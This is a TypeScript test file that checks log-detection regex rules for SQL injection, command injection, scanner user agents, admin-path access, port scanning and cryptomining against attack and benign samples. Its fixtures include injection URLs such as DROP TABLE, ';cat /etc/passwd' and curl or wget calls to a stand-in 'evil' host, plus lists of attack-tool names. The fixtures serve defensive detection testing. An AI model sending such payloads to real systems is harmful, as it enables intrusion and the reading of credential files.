/**
 * Detection-rule coverage tests.
 *
 * Rules are data, so a pattern can quietly stop matching what it was written
 * for without anything failing. These pin two blind spots found by firing
 * synthetic attacks through the live pipeline:
 *
 *  1. PROXY-001 missed percent-encoded SQL injection. The rules engine compiles
 *     patterns with `new RegExp(value)` — no flags — so matching is
 *     case-sensitive, and `\b` does not help after an encoded separator because
 *     in "%20UNION" the character before U is '0', a word character. Real
 *     tooling emits encoded, often lowercase payloads, so the rule caught
 *     roughly half of what it should.
 *  2. PROXY-005 keys on user_agent, which only some HTTP parsers capture.
 *
 * Run with `npm test` (tsx --test).
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as path from 'path';
import * as yaml from 'js-yaml';
import { compileUserRegex } from './userRegex';

const RULES = path.join(__dirname, '../../../../rules');

function ruleRegex(file: string, field: string): RegExp {
  const doc = yaml.load(fs.readFileSync(path.join(RULES, file), 'utf8')) as any;
  const cond = doc.conditions.find((c: any) => c.field === field && c.operator === 'regex');
  assert.ok(cond, `${file} has no regex condition on ${field}`);
  // Compiled exactly as rulesEngine does, honouring the rule's own flags.
  const { regex } = compileUserRegex(String(cond.value), cond.flags);
  return regex;
}

const SQLI = ruleRegex('reverse-proxy/PROXY-001-sql-injection.yaml', 'path');

const ENCODED_ATTACKS: Array<[string, string]> = [
  ['percent-encoded quote (sqlmap default)', "/product?id=1%27"],
  ['percent-encoded double quote', '/product?id=1%22'],
  ['encoded UNION SELECT', '/product?id=-1%20UNION%20SELECT%201,2,3'],
  ['encoded lowercase union select', '/product?id=-1%20union%20select%201,2,3'],
  ['mixed-case keyword', '/product?id=1+UnIoN+SeLeCt+null'],
  ['encoded comment marker', '/product?id=1%2D%2D+'],
  ['encoded semicolon then DROP', '/product?id=1%3B+DROP+TABLE+users'],
  ['lowercase drop table', '/product?id=1;drop table users'],
  ['uppercase hex literal', '/product?id=0X4142'],
];

const LITERAL_ATTACKS: Array<[string, string]> = [
  ['literal quote', "/product?id=1'"],
  ['plus-separated UNION', '/search?q=1+UNION+SELECT+*+FROM+users--'],
  ['boolean OR injection', "/login?u=admin'+OR+'1'='1"],
];

// URLs that must NOT alert. A SQL-injection rule that fires on ordinary traffic
// is worse than one that misses, because the noise trains operators to ignore it.
const BENIGN = [
  '/index.html',
  '/api/v1/health',
  '/articles/communion-service', // contains "union"
  '/docs/selection-guide', // contains "select"
  '/search?q=cats+or+dogs', // natural-language lowercase "or"
  '/blog/my-first-post',
  '/static/js/app.min.js',
  '/report?year=2026&month=07',
  '/search?q=hello%20world',
  '/u/0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0',
  '/products/dropdown-menu', // contains "drop"
  '/account/updates', // contains "update"
];

for (const [label, url] of [...ENCODED_ATTACKS, ...LITERAL_ATTACKS]) {
  test(`PROXY-001 detects SQL injection: ${label}`, () => {
    assert.ok(SQLI.test(url), `pattern did not match ${url}`);
  });
}

test('PROXY-001 does not fire on ordinary traffic', () => {
  const firing = BENIGN.filter((u) => SQLI.test(u));
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('PROXY-005 keys on user_agent, so its source parser must capture one', () => {
  // The rule is only reachable from parsers that actually extract user_agent.
  // apache-nginx-access-log does not, which is why it must not sort ahead of
  // standard-nginx-access (see parserPriority.test.ts).
  const doc = yaml.load(
    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-005-malicious-user-agent.yaml'), 'utf8')
  ) as any;
  assert.ok(doc.conditions.some((c: any) => c.field === 'user_agent'));

  const catalog = path.join(__dirname, '../../../../catalog/parsers');
  const capturing = fs
    .readdirSync(catalog)
    .filter((f) => f.endsWith('.parser.json'))
    .map((f) => JSON.parse(fs.readFileSync(path.join(catalog, f), 'utf8')))
    .filter((p) => JSON.stringify(p.field_mappings).includes('user_agent'));

  assert.ok(capturing.length > 0, 'no catalog parser captures user_agent at all');
});


// ---------------------------------------------------------------------------
// PROXY-002 had the same two blind spots as PROXY-001: case-sensitive matching
// (so CURL/WGET/PowerShell slipped past a lowercase keyword list) and no
// coverage of percent-encoded separators. It now declares `flags: i` and
// mirrors the literal branches for %3B / %7C / %24%28.
// ---------------------------------------------------------------------------

const CMDI = ruleRegex('reverse-proxy/PROXY-002-command-injection.yaml', 'path');

const CMDI_ATTACKS: Array<[string, string]> = [
  ['lowercase ;cat', '/ping?host=127.0.0.1;cat+/etc/passwd'],
  ['uppercase ;CAT', '/ping?host=127.0.0.1;CAT+/etc/passwd'],
  ['mixed-case ;CuRl', '/ping?host=1.1.1.1;CuRl+http://evil'],
  ['uppercase ;WGET', '/ping?host=1.1.1.1;WGET+http://evil'],
  ['capitalised PowerShell', '/run?c=1;PowerShell+-enc+ZQBj'],
  ['encoded semicolon + cat', '/ping?host=127.0.0.1%3Bcat%20/etc/passwd'],
  ['encoded semicolon + CURL', '/ping?host=127.0.0.1%3BCURL%20http://evil'],
  ['encoded pipe + id', '/ping?host=127.0.0.1%7Cid'],
  ['encoded command substitution', '/run?c=%24%28whoami%29'],
  ['literal pipe + whoami', '/ping?host=1.1.1.1|whoami'],
  ['backtick substitution', '/run?c=`id`'],
  ['newline injection', '/run?c=1%0awhoami'],
];

// "cat", "bash" and friends appear in ordinary URLs — they must only alert when
// preceded by a shell metacharacter, encoded or not.
const CMDI_BENIGN = [
  '/index.html',
  '/api/v1/health',
  '/docs/bash-scripting-guide',
  '/catalog/items',
  '/categories/shoes',
  '/blog/how-to-curl-an-api',
  '/search?q=hello%20world',
  '/products?category=shoes&size=10',
  '/report?year=2026&month=07',
  '/static/js/app.min.js',
];

for (const [label, url] of CMDI_ATTACKS) {
  test(`PROXY-002 detects command injection: ${label}`, () => {
    assert.ok(CMDI.test(url), `pattern did not match ${url}`);
  });
}

test('PROXY-002 does not fire on ordinary traffic', () => {
  const firing = CMDI_BENIGN.filter((u) => CMDI.test(u));
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('PROXY-002 declares the flags it depends on', () => {
  // The keyword lists are lowercase; without flags: i the rule silently reverts
  // to catching only lowercase payloads.
  const doc = yaml.load(
    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-002-command-injection.yaml'), 'utf8')
  ) as any;
  const cond = doc.conditions.find((c: any) => c.operator === 'regex');
  assert.equal(cond.flags, 'i');
});


// ---------------------------------------------------------------------------
// PROXY-005 keys on user_agent, which scanners capitalise inconsistently. Plain
// case-insensitivity is NOT enough here: several tokens are short words that
// occur inside legitimate agents, so `flags: i` alone starts firing on
// Zapier/1.0 and HydrationTracker. The word boundaries are load-bearing — and
// they also fix a false positive that predates the flag, since lowercase
// "zapier/1.0" matched the bare "zap" alternative.
// ---------------------------------------------------------------------------

const SCANNER_UA = ruleRegex('reverse-proxy/PROXY-005-malicious-user-agent.yaml', 'user_agent');

const SCANNER_AGENTS: Array<[string, string]> = [
  ['sqlmap lowercase', 'sqlmap/1.7.2#stable (http://sqlmap.org)'],
  ['SQLMap capitalised', 'SQLMap/1.7.2'],
  ['Nikto', 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)'],
  ['Nmap NSE', 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'],
  ['ZAP', 'Mozilla/5.0 (X11; Linux x86_64) ZAP/2.14.0'],
  ['zaproxy', 'zaproxy/2.14.0'],
  ['Burp Suite', 'Mozilla/5.0 (Burp Suite Professional)'],
  ['masscan', 'masscan/1.3.2'],
  ['WPScan', 'WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)'],
  ['gobuster', 'gobuster/3.6'],
  ['Nessus', 'Mozilla/5.0 (compatible; Nessus)'],
  ['w3af', 'w3af.org'],
  ['Hydra', 'Hydra/9.5'],
];

const LEGITIMATE_AGENTS: Array<[string, string]> = [
  ['Chrome', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36'],
  ['Firefox', 'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0'],
  ['Safari iOS', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Version/17.5 Safari/604.1'],
  ['curl', 'curl/8.5.0'],
  ['Googlebot', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
  // Contains "zap". Capitalised did not match before the flag; lowercase DID —
  // an existing false positive the word boundaries remove.
  ['Zapier capitalised', 'Zapier/1.0'],
  ['zapier lowercase', 'zapier/1.0'],
  ['Uptime Kuma', 'Uptime-Kuma/1.23.13'],
  ['Postman', 'PostmanRuntime/7.39.0'],
  ['Datadog', 'Datadog Agent/7.54.0'],
  ['python-requests', 'python-requests/2.32.3'],
  ['app containing "hydra"', 'HydrationTracker/2.1 (iOS)'],
];

for (const [label, ua] of SCANNER_AGENTS) {
  test(`PROXY-005 detects scanner user-agent: ${label}`, () => {
    assert.ok(SCANNER_UA.test(ua), `pattern did not match ${ua}`);
  });
}

test('PROXY-005 does not fire on legitimate user agents', () => {
  const firing = LEGITIMATE_AGENTS.filter(([, ua]) => SCANNER_UA.test(ua)).map(([l]) => l);
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('PROXY-005 keeps the word boundaries its flags depend on', () => {
  // Regression guard: dropping \b while keeping flags: i reintroduces the
  // Zapier/HydrationTracker false positives measured when this was written.
  const doc = yaml.load(
    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-005-malicious-user-agent.yaml'), 'utf8')
  ) as any;
  const cond = doc.conditions.find((c: any) => c.operator === 'regex');
  assert.equal(cond.flags, 'i');
  assert.match(String(cond.value), /^\\b\(/, 'alternation must be wrapped in word boundaries');
  assert.match(String(cond.value), /\)\\b$/, 'alternation must be wrapped in word boundaries');
});


// ---------------------------------------------------------------------------
// AUTH / INFRA case audit.
//
// `contains` is already case-insensitive (conditionMatch lowercases both
// sides), so most AUTH rules were fine. The `regex` conditions were not, and
// six of them missed the capitalisation real logs use. Two could NOT simply
// take flags: i — the cases worth pinning, because the naive fix is wrong:
//
//   INFRA-001 matches "SYN", a TCP flag written in caps. Case-insensitively,
//   "syn" matches "syntax error" — an ordinary log line would alert as a port
//   scan. The prose phrases get case classes; SYN stays case-sensitive.
//
//   INFRA-004 matches "t-rex", a real miner and an ordinary word.
//   Case-insensitively it alerts on a "T-Rex" page. Only the miners that
//   genuinely capitalise themselves get case classes.
// ---------------------------------------------------------------------------

const CASE_AUDIT: Array<{
  file: string;
  field: string;
  detects: Array<[string, string]>;
  ignores: Array<[string, string]>;
}> = [
  {
    file: 'authentication/AUTH-007-sso-authentication-failures.yaml',
    field: 'service',
    detects: [
      ['lowercase', 'authelia'],
      ['capitalised', 'Authelia'],
      ['upper', 'AUTHENTIK'],
      ['keycloak event source', 'org.keycloak.events'],
    ],
    ignores: [['nginx', 'nginx'], ['cron', 'CRON']],
  },
  {
    file: 'authentication/AUTH-011-admin-interface-unusual-ip.yaml',
    field: 'path',
    detects: [
      ['lowercase admin', '/admin/index.php'],
      ['capitalised admin', '/Admin/index.php'],
      ['capitalised manage', '/Manage/Users'],
      ['console', '/console'],
    ],
    // These matched before the word boundary was added — existing false positives.
    ignores: [
      ['managers report', '/managers-report.pdf'],
      ['administrators guide', '/administrators-guide'],
      ['static asset', '/static/app.js'],
    ],
  },
  {
    file: 'infrastructure/INFRA-001-port-scanning.yaml',
    field: 'message',
    detects: [
      ['lowercase phrase', 'connection refused from 10.0.0.5'],
      ['canonical capitalisation', 'Connection refused'],
      ['capitalised attempt', 'Connection attempt from 10.0.0.5 rejected'],
      ['no route to host', 'No route to host'],
      ['TCP SYN flag', 'SYN flood detected'],
    ],
    // The reason SYN stays case-sensitive.
    ignores: [
      ['syntax error', 'syntax error near line 4'],
      ['time sync', 'synchronizing time'],
      ['ordinary request', 'GET /index.html 200'],
    ],
  },
  {
    file: 'infrastructure/INFRA-003-unusual-service-restarts.yaml',
    field: 'message',
    detects: [
      ['systemd Starting', 'Starting nginx.service'],
      ['systemd Stopped', 'Stopped nginx.service'],
      ['lowercase restarting', 'restarting docker'],
      ['capitalised Restarting', 'Restarting docker'],
    ],
    ignores: [['login', 'user alice logged in'], ['request', 'GET /health 200']],
  },
  {
    file: 'infrastructure/INFRA-004-cryptomining-detection.yaml',
    field: 'message',
    detects: [
      ['lowercase binary', 'xmrig started'],
      ['XMRig own banner', 'XMRig 6.21.0 starting'],
      ['PhoenixMiner', 'PhoenixMiner 5.9'],
      ['Claymore', 'Claymore v15'],
      ['lolMiner', 'lolMiner 1.76'],
      ['minerd', 'minerd connecting to pool'],
    ],
    // The reason t-rex stays case-sensitive, plus words containing "miner".
    ignores: [
      ['T-Rex page', 'T-Rex dinosaur exhibit page'],
      ['determiner', 'determiner parsing done'],
      ['examiner', 'examiner login'],
      ['coal miner report', 'coal-miner-report.pdf requested'],
    ],
  },
];

for (const spec of CASE_AUDIT) {
  const re = ruleRegex(spec.file, spec.field);
  const id = path.basename(spec.file).replace('.yaml', '');

  for (const [label, subject] of spec.detects) {
    test(`${id} detects ${label}`, () => {
      assert.ok(re.test(subject), `did not match ${JSON.stringify(subject)}`);
    });
  }

  test(`${id} ignores ordinary log lines`, () => {
    const firing = spec.ignores.filter(([, s]) => re.test(s)).map(([l]) => l);
    assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
  });
}


// ---------------------------------------------------------------------------
// ACCESS-002 shares AUTH-011's admin-path list and had the same two problems:
// case-sensitive matching, and no word boundary — so "/manage" matched
// /managers-report.pdf and "/admin" matched /administrators-guide. Those were
// false positives before the boundary was added, not new ones.
// ---------------------------------------------------------------------------

const ADMIN_PATH = ruleRegex('access-control/ACCESS-002-unauthorized-admin-access.yaml', 'path');

const ADMIN_HITS: Array<[string, string]> = [
  ['lowercase admin', '/admin/index.php'],
  ['capitalised admin', '/Admin/index.php'],
  ['wp-admin', '/wp-admin/'],
  ['capitalised WP-Admin', '/WP-Admin/'],
  ['phpmyadmin', '/phpmyadmin/'],
  ['portainer', '/portainer/#/'],
  ['traefik dashboard', '/traefik/dashboard'],
  ['capitalised Dashboard', '/Dashboard'],
  ['manage', '/manage/users'],
];

const ADMIN_MISSES: Array<[string, string]> = [
  ['managers report', '/managers-report.pdf'],
  ['manageable items', '/manageable-items'],
  ['administrators guide', '/administrators-guide'],
  ['home page', '/index.html'],
  ['api health', '/api/health'],
  ['static asset', '/static/app.js'],
];

for (const [label, url] of ADMIN_HITS) {
  test(`ACCESS-002 detects admin interface access: ${label}`, () => {
    assert.ok(ADMIN_PATH.test(url), `did not match ${url}`);
  });
}

test('ACCESS-002 does not fire on paths that merely start with an admin word', () => {
  const firing = ADMIN_MISSES.filter(([, u]) => ADMIN_PATH.test(u)).map(([l]) => l);
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('ACCESS-002 and AUTH-011 stay consistent — same list, same guards', () => {
  // They cover the same ground from different angles (unauthenticated access vs
  // access from an unexpected IP); letting one drift would be a silent gap.
  for (const file of [
    'access-control/ACCESS-002-unauthorized-admin-access.yaml',
    'authentication/AUTH-011-admin-interface-unusual-ip.yaml',
  ]) {
    const doc = yaml.load(fs.readFileSync(path.join(RULES, file), 'utf8')) as any;
    const cond = doc.conditions.find((c: any) => c.field === 'path' && c.operator === 'regex');
    assert.equal(cond.flags, 'i', `${file} lost its case-insensitivity`);
    assert.match(String(cond.value), /\\b/, `${file} lost its word boundary`);
  }
});
